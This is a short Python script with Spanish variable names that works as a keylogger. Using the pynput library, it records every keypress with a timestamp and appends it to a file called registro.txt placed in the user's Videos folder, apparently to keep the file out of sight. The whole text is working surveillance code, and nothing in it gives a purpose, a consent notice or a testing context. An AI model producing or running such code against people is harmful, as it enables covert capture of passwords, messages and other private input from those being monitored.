from pynput import keyboard
from datetime import datetime
import os

ruta_archivo = os.path.expanduser("~/Videos/registro.txt")

def guardar_tecla(key):
    try:
        tecla = key.char
    except AttributeError:
        tecla = str(key)
    fecha_hora = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    linea = f"[{fecha_hora}] {tecla}\n"
    with open(ruta_archivo, "a") as archivo:
        archivo.write(linea)

with keyboard.Listener(on_press=guardar_tecla) as listener:
    listener.join()
